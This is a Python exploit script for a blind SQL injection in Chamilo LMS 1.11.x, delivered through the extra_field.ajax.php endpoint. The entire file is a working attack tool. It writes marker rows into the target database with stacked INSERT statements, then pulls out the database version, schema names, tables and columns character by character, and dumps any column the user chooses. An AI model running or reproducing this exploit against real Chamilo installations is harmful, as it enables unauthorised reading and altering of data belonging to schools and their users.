import warnings
import requests
import sys

warnings.filterwarnings("ignore")

def send_payload(url, payload):
    headers = {
        "Accept": "*/*",
        "User-Agent": "Mozilla/5.0",
        "Connection": "close",
        "Host": f"{url.split('/')[2]}",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": "max-age=0",
        "Accept-Language": "en-US;q=0.9,en;q=0.8"
    }
    full_url = f"{url}/main/inc/ajax/extra_field.ajax.php?a=search_options_from_tags&type=any&field_id=any&tag=any&from=image&search=image&options=[\"Lol{payload}\"]"
    
    try:
        response = requests.get(full_url, headers=headers, verify=False, timeout=60)
        return response.text
    except (requests.exceptions.Timeout, requests.exceptions.RequestException):
        return None

def generate_payload(action, db_name=None, table_name=None, column_name=None):
    if action == "check":
        return 0, "');+INSERT+INTO+extra_field_rel_tag(field_id,+tag_id,+item_id)+VALUES+(16,+16,+16);+INSERT+INTO+extra_field_values(field_id,+item_id,value)+VALUES+(16,+16,'bugSQLi');+INSERT+INTO+extra_field_options(option_value)+VALUES+('bugSQLi');+INSERT+INTO+tag+(id,+tag,+field_id,count)+VALUES(16,+'bugSQLi',+16,0)+ON+DUPLICATE+KEY+UPDATE+tag='bugSQLi',+field_id=16,+count=0;++--+"
    
    if action == "version":
        print("[+] Version DB:")
        return 2, "')+OR+ascii(substring(version(),{},1))={}+--+"
    
    if action == "countdb":
        print("[+] DB Count:")
        return 1, "')+OR+(SELECT+COUNT(schema_name)+FROM+information_schema.schemata)={}+--+"
        
    if action == "database":
        print("[+] List Databases:")
        return 3, "')+OR+ascii(substring((SELECT+schema_name+FROM+information_schema.schemata+LIMIT+1+OFFSET+{}),{},1))={}+--+"

    if action == "countable":
        if not db_name:
            sys.exit("You must provide the database name with the 'countable' option.")
        print(f"[+] Table Count of {db_name} DB:")
        return 1, f"')+OR+(SELECT+COUNT(table_name)+FROM+information_schema.tables+WHERE+table_schema='{db_name}')={{}}+--+"

    if action == "table":
        if not db_name:
            sys.exit("You must provide the database name with the 'table' option.")
        print(f"[+] List Tables in {db_name}:")
        return 3, f"')+OR+ascii(substring((SELECT+table_name+FROM+information_schema.tables+WHERE+table_schema='{db_name}'+LIMIT+1+OFFSET+{{}}),{{}},1))={{}}+--+"

    if action == "column":
        if not db_name or not table_name:
            sys.exit("You must provide the database name and the table name with the 'column' option.")
        print(f"[+] List Columns in {db_name}.{table_name}:")
        return 3, f"')+OR+ascii(substring((SELECT+column_name+FROM+information_schema.columns+WHERE+table_name='{table_name}'+AND+table_schema='{db_name}'+LIMIT+1+OFFSET+{{}}),{{}},1))={{}}+--+"

    if action == "dump":
        if not column_name or not table_name:
            sys.exit("You must provide the table name and the column name with the 'dump' option.")
        print(f"[+] Dump in {table_name}.{column_name}:")
        return 3, f"')+OR+ascii(substring((SELECT+{column_name}+FROM+{table_name}+LIMIT+1+OFFSET+{{}}),{{}},1))={{}}+--+"
    
    sys.exit("Invalid action. Use: version, database, table, column, or dump.")

def exploit(url, payload_function, parametros):    
    if parametros == 0:
        response = send_payload(url, payload_function)
        payload = "')+OR+1=1+--+"
        response = send_payload(url, payload)
        if response and "bugSQLi" in response:
            print("Vulnerable Target :)")
        else:
            print("Target not Vulnerable :/")
    
    elif parametros == 1:
        for count in range(0, 500):
            payload = payload_function.format(count)
            response = send_payload(url, payload)
            if response and "bugSQLi" in response:
                break
        print(f"Total {count}")

    elif parametros == 2:
        for b in range(1, 51):
            found = False
            for c in range(32, 128):
                payload = payload_function.format(b, c)
                response = send_payload(url, payload)
                if response and "bugSQLi" in response:
                    print(chr(c), end='', flush=True)
                    found = True
                    break
            
            if not found:
                print()
                sys.exit()

    elif parametros == 3:
        for a in range(0, 100):
            found_1 = False
            for b in range(1, 51):
                found_2 = False
                for c in range(32, 128):
                    payload = payload_function.format(a, b, c)
                    response = send_payload(url, payload)
                    if response and "bugSQLi" in response:
                        print(chr(c), end='', flush=True)
                        found_1 = True
                        found_2 = True
                        break
            
                if not found_2:
                    print()
                    break

            if not found_1:
                sys.exit()

if __name__ == "__main__":
    banner = '''
░██████╗░██████╗░██╗░░░░░  ██╗███╗░░██╗░░░░░██╗███████╗░█████╗░████████╗██╗░█████╗░███╗░░██╗
██╔════╝██╔═══██╗██║░░░░░  ██║████╗░██║░░░░░██║██╔════╝██╔══██╗╚══██╔══╝██║██╔══██╗████╗░██║
╚█████╗░██║██╗██║██║░░░░░  ██║██╔██╗██║░░░░░██║█████╗░░██║░░╚═╝░░░██║░░░██║██║░░██║██╔██╗██║
░╚═══██╗╚██████╔╝██║░░░░░  ██║██║╚████║██╗░░██║██╔══╝░░██║░░██╗░░░██║░░░██║██║░░██║██║╚████║
██████╔╝░╚═██╔═╝░███████╗  ██║██║░╚███║╚█████╔╝███████╗╚█████╔╝░░░██║░░░██║╚█████╔╝██║░╚███║
╚═════╝░░░░╚═╝░░░╚══════╝  ╚═╝╚═╝░░╚══╝░╚════╝░╚══════╝░╚════╝░░░░╚═╝░░░╚═╝░╚════╝░╚═╝░░╚══╝

   ░█████╗░██╗░░██╗░█████╗░███╗░░░███╗██╗██╗░░░░░░█████╗░  ██╗░░░░░███╗░░░███╗░██████╗
   ██╔══██╗██║░░██║██╔══██╗████╗░████║██║██║░░░░░██╔══██╗  ██║░░░░░████╗░████║██╔════╝
   ██║░░╚═╝███████║███████║██╔████╔██║██║██║░░░░░██║░░██║  ██║░░░░░██╔████╔██║╚█████╗░
   ██║░░██╗██╔══██║██╔══██║██║╚██╔╝██║██║██║░░░░░██║░░██║  ██║░░░░░██║╚██╔╝██║░╚═══██╗
   ╚█████╔╝██║░░██║██║░░██║██║░╚═╝░██║██║███████╗╚█████╔╝  ███████╗██║░╚═╝░██║██████╔╝
   ░╚════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝╚══════╝░╚════╝░  ╚══════╝╚═╝░░░░░╚═╝╚═════╝░
                                    𝕍𝕖𝕣𝕤𝕚𝕠𝕟 𝟙.𝟙𝟙.𝕩
                                       @𝕤𝟙𝕜𝕣𝟙𝟘𝕤
    '''
    print(banner)

    if len(sys.argv) < 3:
        sys.exit("Use: python Chamilo-bSQLi.py <URL> <Option> [DB Name] [Table Name] [Column Name]\nOptions: check, version, countdb, database, countable, table, column, dump")

    url = sys.argv[1]
    action = sys.argv[2]

    db_name = sys.argv[3] if len(sys.argv) >= 4 else None
    table_name = sys.argv[4] if len(sys.argv) >= 5 else None
    column_name = sys.argv[5] if len(sys.argv) >= 6 else None

    # Ignorar argumentos adicionales en 'dump'
    if action == "dump":
        table_name = sys.argv[3]
        column_name = sys.argv[4]

    parametros, payload_function = generate_payload(action, db_name, table_name, column_name)
    exploit(url, payload_function, parametros)
